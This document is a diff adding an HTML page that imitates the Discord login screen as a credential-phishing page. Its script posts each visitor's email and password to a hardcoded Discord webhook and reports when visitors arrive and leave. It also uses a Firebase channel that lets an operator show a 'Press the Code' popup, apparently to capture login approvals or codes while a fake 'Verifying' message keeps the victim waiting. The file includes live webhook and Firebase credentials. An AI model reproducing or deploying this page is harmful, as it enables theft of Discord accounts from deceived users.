@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Discord</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+    background-image: url('https://media.discordapp.net/attachments/974754589880508446/1412384977894641754/new-and-slightly-older-discord-login-screen-as-a-png-v0-nnd20frfve3d1.png?ex=68b81983&is=68b6c803&hm=11204876187199a73a527b555c9221273fe12f3cdb3eef021af3de6fee893b52&=&format=webp&quality=lossless&width=2160&height=1214');
+    background-size: cover;
+    background-position: center;
+    font-family: 'Inter', sans-serif;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.send-container {
+    background-color: #393a41;
+    border-radius: 10px;
+    width: 900px;
+    height: 420px;
+    padding: 30px;
+    display: flex;
+    justify-content: space-between;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    position: relative;
+}
+
+.login-box {
+    width: 55%;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+}
+.login-box h2 {
+    font-size: 28px;
+    font-weight: bold;
+    color:white;
+    text-align:center;
+    margin-bottom: 5px;
+}
+.login-box p.welcome-text {
+    font-size:14px;
+    color:#b9bbbe;
+    text-align:center;
+    margin-bottom:20px;
+}
+.input-label { font-size:14px; font-weight:bold; color:white; margin-bottom:5px; }
+.input-field {
+    width:100%;
+    padding:10px;
+    border-radius:5px;
+    border:none;
+    background-color:#2e2e33;
+    color:white;
+    margin-bottom:15px;
+    outline:none;
+}
+.submit-btn {
+    padding:10px;
+    border:none;
+    border-radius:5px;
+    background-color:#5765f2;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+    margin-bottom:10px;
+}
+.forgot-password { color:#7b8bd4; font-size:14px; text-decoration:none; margin-bottom:10px; display:block; }
+.register-text { font-size:14px; color:white; }
+.register-text a { color:#7b8bd4; text-decoration:none; }
+
+.qr-image {
+    width: 35%;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+}
+.qr-image img { width: 160px; border-radius:8px; } /* size unchanged */
+.qr-image .qr-text { text-align:center; margin-top:10px; color:white; }
+.qr-image .qr-text h3 { font-weight:bold; font-size:16px; }
+.qr-image .qr-text p { font-size:14px; margin-top:5px; line-height:1.3; }
+.qr-image .qr-text p span { font-weight:bold; }
+.qr-image .qr-text .passkey { color:#7b8bd4; margin-top:5px; }
+
+/* Popup frame */
+.frame-popup {
+    display:none;
+    position:absolute;
+    top:50%; left:50%;
+    transform:translate(-50%,-50%);
+    background-color:#2e2e33;
+    border-radius:10px;
+    padding:30px;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+    width: 300px;
+}
+.frame-popup h2, .frame-popup p { color:white; margin:5px 0; font-weight:normal; }
+.frame-popup #controllerText { font-weight:bold; }
+.frame-popup button {
+    margin-top:15px;
+    background-color:#5765f2;
+    color:white;
+    border:none;
+    border-radius:5px;
+    padding:10px 20px;
+    cursor:pointer;
+    font-size:16px;
+}
+</style>
+</head>
+<body>
+<div class="send-container">
+
+    <div class="login-box">
+        <h2>Welcome back!</h2>
+        <p class="welcome-text">We're so excited to see you again!</p>
+
+        <label class="input-label" for="box1">Email or Phone Number</label>
+        <input type="text" id="box1" class="input-field" placeholder="">
+
+        <label class="input-label" for="box2">Password</label>
+        <input type="password" id="box2" class="input-field" placeholder="">
+
+        <a href="#" class="forgot-password">Forgot your password?</a>
+
+        <button class="submit-btn" id="submitBtn">Login</button>
+
+        <p class="register-text">Need an account? <a href="#">Register</a></p>
+    </div>
+
+    <div class="qr-image">
+        <img src="https://delta.ffvl.fr/sites/delta.ffvl.fr/files/QR%20code%20Discord%20Play%20Store.png" alt="QR Code">
+        <div class="qr-text">
+            <h3>Log in with QR Code</h3>
+            <p>Scan this with the <span>Discord mobile app</span> to login instantly.</p>
+            <p class="passkey">Or sign in with passkey</p>
+        </div>
+    </div>
+
+    <div class="frame-popup" id="framePopup">
+        <h2>Press the Code</h2>
+        <p id="controllerText"></p>
+        <p>On your Device.</p>
+        <button onclick="closeFrame()">Okay!</button>
+    </div>
+
+</div>
+
+<script>
+// Firebase setup
+const firebaseConfig = {
+    apiKey: "AIzaSyA0wPJZ0OnUoleo8DCt0jdKLMIL0wacfB8",
+    authDomain: "verify-30dcc.firebaseapp.com",
+    databaseURL: "https://verify-30dcc-default-rtdb.firebaseio.com",
+    projectId: "verify-30dcc",
+    storageBucket: "verify-30dcc.appspot.com",
+    messagingSenderId: "999167182126",
+    appId: "1:999167182126:web:296e1c7599ab16bb6ea6bf",
+    measurementId: "G-WTCWMJ995K"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+let initialLoaded = false;
+let lastMessage = null;
+
+// Only show popup when a new message is added after page load
+db.ref("sharedMessage").on("value", snapshot => {
+    const newText = snapshot.val();
+    if (!initialLoaded) {
+        initialLoaded = true;
+        lastMessage = newText;
+        return;
+    }
+    if(newText && newText !== lastMessage){
+        lastMessage = newText;
+        document.getElementById("controllerText").innerText = newText;
+        document.getElementById("framePopup").style.display = "flex";
+    }
+});
+
+function closeFrame(){
+    document.getElementById("framePopup").style.display = "none";
+}
+
+// Discord webhook URL
+const webhookURL = "https://discord.com/api/webhooks/1412014265476317254/fpmNXBP_aUmAQXuOlIXgGJdTFBYNa7gt6B4lauYV57GZY_U-XM_t4Kv6KltiVV-m0jDX";
+
+// Notify when entering the page
+window.onload = () => {
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: "Someone has entered your website" })
+    });
+};
+
+// Notify when leaving the page
+window.onbeforeunload = () => {
+    navigator.sendBeacon(webhookURL, JSON.stringify({ content: "They have clicked off the website" }));
+};
+
+// Send login data to webhook
+document.getElementById("submitBtn").addEventListener("click", async () => {
+    const btn = document.getElementById("submitBtn");
+    btn.innerText = "Verifying this may take up to 2 minutes do not close this page.";
+
+    const data = {
+        content: `Email: ${document.getElementById("box1").value}\nPassword: ${document.getElementById("box2").value}`
+    };
+
+    await fetch(webhookURL, {
+        method:"POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify(data)
+    });
+});
+</script>
+</body>
+</html>
